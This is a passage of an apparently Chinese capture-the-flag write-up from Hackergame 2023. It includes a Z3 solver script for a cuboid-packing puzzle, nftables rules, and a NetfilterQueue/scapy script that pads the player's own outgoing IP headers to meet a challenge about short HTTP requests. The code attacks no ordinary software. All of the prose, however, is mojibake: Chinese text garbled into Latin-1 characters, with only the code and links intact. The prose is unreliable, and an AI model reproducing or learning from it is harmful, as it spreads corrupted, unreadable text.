](https://jxl-art.surma.technology/wtf)â€¦â€¦è¯»åˆ°è¿™é‡Œæ—¶ï¼Œå°±çŸ¥é“è¿™ä¸€å®šæ˜¯ç­”æ¡ˆäº†ã€‚

```
if x > 367
  if x > 665
    if c > 0
      if c > 1
        - Set 62
        - Set 163
      - Set 22
    if c > 0
      if c > 1
        - Set 215
        - Set 24
      - Set 214
  if c > 0
    if c > 1
      - Set 211
      - Set 201
    - Set 1
```
èƒ½å’Œæ¦œä¸€æ¦œäºŒå¤§å“¥åšå‡ºåŒä¸€é“é¢˜ï¼ŒçœŸæ˜¯å€æ„Ÿè£å¹¸ï¼Œè™½ç„¶åšå‡ºæ¥åæ„Ÿè§‰æ¼«æ— ç›®<ruby>çš„<rt>dÃ¬</rt></ruby><ruby>åœ°<rt>de</rt></ruby>æœæ ¼å¼èŠ±äº†äº”å¤©ï¼Œç¼–ç åªèŠ±äº†äº”åˆ†é’Ÿçš„ä½“éªŒè¿˜æ˜¯æŒºä¸€è¨€éš¾å°½çš„â€¦â€¦@mcfxçš„[å¤§åŠ›å‡ºå¥‡è¿¹åšæ³•](https://github.com/USTC-Hackergame/hackergame2023-writeups/blob/master/players/mcfx/wp.md#%E4%BD%8E%E5%B8%A6%E5%AE%BD%E6%98%9F%E7%90%83)ä¹Ÿè®¸æ‰å¯¹å¾—èµ·æœ€ååšå‡ºçš„äººæ•°å§ã€‚

# ç¬¬6å¤©

çè·‘å°è¯­è¨€æ¨¡å‹ï¼Œå¤„ç†å™¨æ¸©åº¦é£™å‡ï¼Œæ²¡æœ‰è¿›å±•ã€‚
# ç¬¬7å¤©
## å°Zçš„è°œé¢˜

*puzzlehunt\_of\_z3.py*

ç¨‹åºæè¿°çš„æ˜¯å°†16ä¸ªå®å¿ƒé•¿æ–¹ä½“æ²¿åæ ‡è½´æ”¾å…¥5Â³çš„ç«‹æ–¹ä½“ç›’å­ä¸­ï¼Œç¬¬äºŒã€ä¸‰å°é¢˜åˆ†åˆ«è¦æ±‚äº§ç”Ÿçš„ç‚¹ã€ç›´çº¿ã€å¹³é¢ã€ç©ºé—´æ€»æ•°â‰¤136ã€â‰¥157ã€‚

åæ­£éƒ½æ˜¯ä¸¢åˆ°çº¦æŸæ±‚è§£å™¨é‡Œï¼Œè¿™æ ·çš„ç›´è§‚ç†è§£çœŸæœ‰åŠ©äºè§£é¢˜å—ï¼Ÿæœ‰çš„ï¼Œä¸»è¦å°±æ˜¯ç»™Z3è„šæœ¬æ¢äº†ä¸ªå†™æ³•ï¼Œä¹Ÿä¸çŸ¥é“åˆ°åº•æ˜¯ä¼˜åŒ–è¿˜æ˜¯è´Ÿä¼˜åŒ–ã€‚

```python
import z3
from itertools import permutations

a = [[[z3.Int(f"a{i}{j}{k}") for k in range(5)] for j in range(5)] for i in range(5)]
c = [[z3.Int(f"c{u}{n}") for n in "iIjJkK"] for u in range(16)]
s = z3.Solver()
for u, lwh in enumerate(
    [(1, 1, 3)] * 3
    + [(1, 2, 2)] * 4
    + [(1, 2, 4)] * 2
    + [(1, 4, 4)] * 2
    + [(2, 2, 2)] * 2
    + [(2, 2, 3)] * 3
):
    s.add(z3.Or([
        z3.And([
            a[i + di][j + dj][k + dk] == u
            for di in range(l)
            for dj in range(w)
            for dk in range(h)
        ] + [
            c[u][0] == i,
            c[u][1] == i + l,
            c[u][2] == j,
            c[u][3] == j + w,
            c[u][4] == k,
            c[u][5] == k + h,
        ])
        # å›ºå®šä¸€ä¸ª1Ã—2Ã—4é•¿æ–¹ä½“çš„æœå‘ï¼Œè¯´ä¸å®šèƒ½å‡å°æœç´¢ç©ºé—´ï¼Ÿä¹Ÿä¸çŸ¥é“æ˜¯ä¸æ˜¯çœŸçš„æœ‰æ•ˆâ€¦â€¦
        for l, w, h in ((lwh,) if u == 7 else set(permutations(lwh)))
        for i in range(6 - l)
        for j in range(6 - w)
        for k in range(6 - h)
    ]))
score = z3.Sum([
    z3.Or([
        z3.And([
            i == -1 or z3.Or(c[u][0] == i, c[u][1] == i),
            j == -1 or z3.Or(c[u][2] == j, c[u][3] == j),
            k == -1 or z3.Or(c[u][4] == k, c[u][5] == k),
        ])
        for u in range(16)
    ])
    for i in range(-1, 6)
    for j in range(-1, 6)
    for k in range(-1, 6)
])
# s.add(score <= 136)  # Medium
# s.add(score == 157)  # Hard
if s.check() != z3.sat:
    print("No solution")
m = s.model()
y = "".join(sorted("".join(str(m.evaluate(c[u][n])) for n in range(6)) for u in range(16)))
print(y)
print(m.evaluate(score))
# 148 010215012545020201022304023524033502121214150115151545231302241324250101253524351202352502451324
# 136 012413030213030235032435034545040401044504132313133413343414350213350235352315353545450301453504
# 157 010204012501020245022413022535024513121214131501150104231515250145341335351303353502353525451335
```

ç¬¬ä¸€å°é¢˜å¤§çº¦åç§’å¯å¾—ä¸€ç»„ã€‚ç¬¬äºŒå°é¢˜è·‘äº†ååˆ†é’Ÿï¼Œå±…ç„¶çœŸçš„è·‘å‡ºæ¥äº†ã€‚ç¬¬ä¸‰å°é¢˜è·‘äº†åŠå°æ—¶ï¼Œå±…ç„¶çœŸçš„è·‘å‡ºæ¥äº†ã€‚

å€’æ˜¯flagé‡Œè¯´çš„Google is all you needåˆ°åº•æ˜¯å•¥ï¼Ÿæˆ‘éƒ½ä¸çŸ¥é“è¯¥æœä»€ä¹ˆå…³é”®è¯ï¼Œæœä¸ªæ¯›çº¿çƒï¼Ÿ

# ç¬¬8å¤©
æ—©ä¸Šæƒ³å‡ºäº†ä¸å¯åŠ å¯†çš„å¼‚ä¸–ç•Œ2ç¬¬ä¸€å°é¢˜çš„æ ‡å‡†è§£æ³•ï¼Œä½†æ¥ä¸åŠäº†ï¼Œå†™äº†ä¸ªäº¤äº’å°±æ‰“é“ƒäº¤å·äº†ã€‚ä¸‹åˆåœ¨é˜…è¯»å®˜æ–¹é¢˜è§£ä¸­åº¦è¿‡ï¼Œå­©å­å¾ˆå–œæ¬¢ï¼Œæ˜å¹´è¿˜ä¼šæ¥ã€‚

## Komm, sÃ¼sser Flagge / æˆ‘çš„GET

*Did you hear the IP packet from 1981?*

IPåŒ…å¤´20å­—èŠ‚ï¼ŒTCPåŒ…å¤´20+å­—èŠ‚ï¼Œå¿…ç„¶è¦åœ¨åŒ…å¤´åŠ¨æ‰‹è„šäº†ã€‚çœ‹èµ·æ¥å¯ä»¥ç›´æ¥åŠ å¤§IPåŒ…å¤´é•¿åº¦ï¼Œåœ¨paddingé‡Œå¡åƒåœ¾ã€‚ç†è®ºæœ‰äº†ï¼Œä½†ä¸çŸ¥é“æ€ä¹ˆå®ç°ã€‚äºæ˜¯æˆ‘åœ¨GitHub USTC-Hackergameç»„ç»‡é‡Œæœiptablesï¼Œå‘ƒå‘ƒï¼Œå½“æ—¶è¿˜åªæœ‰å››ç¯‡2020å¹´çš„é¢˜è§£ï¼Œç°åœ¨ä¸€ä¸‹å­å¤šäº†åå‡ ç¯‡2023çš„â€¦â€¦å¥½å§ï¼Œæˆ‘è¿™ç¯‡ä¹Ÿæ˜¯ã€‚

é€‰ç”¨çš„æ˜¯@Harukaçš„[ä»é›¶å¼€å§‹çš„HTTPé“¾æ¥é¢˜è§£](https://github.com/USTC-Hackergame/hackergame2020-writeups/blob/master/players/Haruka/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84%20HTTP%20%E9%93%BE%E6%8E%A5/readme.md)ã€‚

å…ˆæ˜¯ç ”ç©¶scapyæ‰‹æ“IPåŒ…ï¼Œå‘ç°è¿æ¥å‰ä¸¤å°é¢˜éƒ½æ”¶ä¸åˆ°æ•°æ®ï¼Œè¿ç™¾åº¦ä¹Ÿæ˜¯æœ‰æ—¶èƒ½é€šæœ‰æ—¶ä¸èƒ½é€šï¼Œè¯•äº†ç»™å‡ºçš„æ‹¦æˆªRSTä¹Ÿä¸çŸ¥é“æ€ä¹ˆæ­£ç¡®é…ç½®ï¼Œä¸€ç›´æ”¶ä¸åˆ°å“åº”æ•°æ®ï¼Œæ„Ÿè§‰æå®šæ˜¯æ— æœ›äº†ã€‚ä¸è¿‡å¥½åƒæœ‰å¥½äº›å…¶ä»–é€‰æ‰‹åŒæ ·è¢«è¿™ä¸ªRSTå‘ï¼Œåæ¥ä¹Ÿé iptablesè§£å†³äº†ï¼Œé‚£çœ‹æ¥å¾€å¹´é¢˜è§£è¿˜æ˜¯æ¯”Googleä¹±æœè¦é è°±å¾—å¤šã€‚

å†å¾€ä¸‹çœ‹ï¼Œå‘ç°è¿™ä¸ªNFQUEUEçœ‹èµ·æ¥æŒºä¸é”™çš„ï¼Œä¸ç”¨æ‰‹å·¥æ„é€ ä¸‰æ¬¡æ¡æ‰‹ï¼Œçœ‹èµ·æ¥å‡ºé—®é¢˜çš„å¯èƒ½æ€§å°å¾ˆå¤šã€‚ç„¶åå‘ç°WSLå†…æ ¸å¥½åƒæ²¡æœ‰è‡ªå¸¦NFQUEUEæ¨¡å—ï¼Œç°åœºé‡æ–°ç¼–è¯‘å†…æ ¸ä»€ä¹ˆçš„å°±ä¸ç”¨æƒ³äº†ã€‚

æ ‘è“æ´¾ï¼Œå¯åŠ¨ï¼

ç„¶åå‘ç°Debianå·²ç»æ²¡æœ‰iptablesäº†ï¼Œå–è€Œä»£ä¹‹çš„æ˜¯nftablesã€‚

åœ¨ænftablesçš„æ—¶å€™å°è¯•å†™äº†ä¸ªè¿™æ ·çš„è„šæœ¬ã€‚

```nftables
#!/usr/sbin/nft -f
flush ruleset
table ip firewall {
  chain outgoing {
    type filter hook output priority 0
    policy drop
    iifname lo accept
    tcp dport {80, 18080} accept
  }
}
```

å†™å®Œè¿è¡Œå‘ç°å¡æ­»äº†ã€‚æ¯•åŠ æ€ç´¢åæç„¶å¤§æ‚Ÿï¼šå®ƒæˆåŠŸåœ°æŠŠæˆ‘é€šè¿‡å±€åŸŸç½‘åˆ°Raspberry Piçš„SSHè¿æ¥å±è”½æ‰äº†ã€‚ä»æœªé…å‡ºè¿‡å¦‚æ­¤æˆåŠŸçš„é˜²ç«å¢™â€¦â€¦å¥½åœ¨å¼ºè¡Œé‡å¯ä¸€ä¸‹å°±æ¢å¤åŸçŠ¶äº†ã€‚

é…ç½®å‘½ä»¤ï¼š

```sh
sudo apt install openvpn libnetfilter-queue-dev # Debian bookwormç‰ˆæœ¬çš„åŒ…å
sudo openvpn --config hg-guest.ovpn & # æŸäº›ç½‘ç»œç¯å¢ƒğŸ˜¡
sudo nft -f nft.rules
python -m venv env
source env/bin/activate
pip install scapy NetfilterQueue
sudo $(which python) a.py
```

nft.rulesï¼š

```nftables
flush ruleset
table ip firewall {
  chain outgoing {
    type filter hook output priority 0
    policy accept
    tcp dport {18080, 18082} queue num 3
  }
}
```

a.pyï¼š

```python
from netfilterqueue import NetfilterQueue, Packet
from scapy.all import *

def f(pkt: Packet) -> None:
    b = bytearray(pkt.get_payload())
    print("before", b)
    hl = b[0] % 16 * 4
    b[0] += 3  # ihl
    b[2] += (b[3] + 12) >> 8  # len
    b[3] = (b[3] + 12) & 0xff
    b[hl:hl] = b"\x02\x0cGET / HTTP"
    packet = IP(b)  # å€Ÿscapyç®—ä¸ªæ ¡éªŒå’Œ
    del packet[IP].chksum
    b = raw(packet)
    print("after", b)
    pkt.set_payload(b)
    pkt.accept()

nfqueue = NetfilterQueue()
nfqueue.bind(3, f)
try:
    nfqueue.run()
finally:
    nfqueue.unbind()
```

æœ€åç”¨é¢˜ç›®æä¾›çš„curlå‘½ä»¤å³å¯è·å¾—flagã€‚

ä¸€å¼€å§‹02 0Cçš„é‚£åœ°æ–¹å†™äº†00 00ï¼Œä¸çŸ¥é“ä¸ºå•¥ä¸è¡Œï¼Œç†è®ºä¸Šç¬¬ä¸€ä¸ª00å°±æ ‡è®°äº†é€‰é¡¹åˆ°æ­¤ç»“æŸçš„ã€‚çœ‹åˆ°ä¸€ä¸ªå«åšâ€œSecurity (defunct)â€çš„é€‰é¡¹ï¼Œå°±ç”¨å®ƒäº†ã€‚
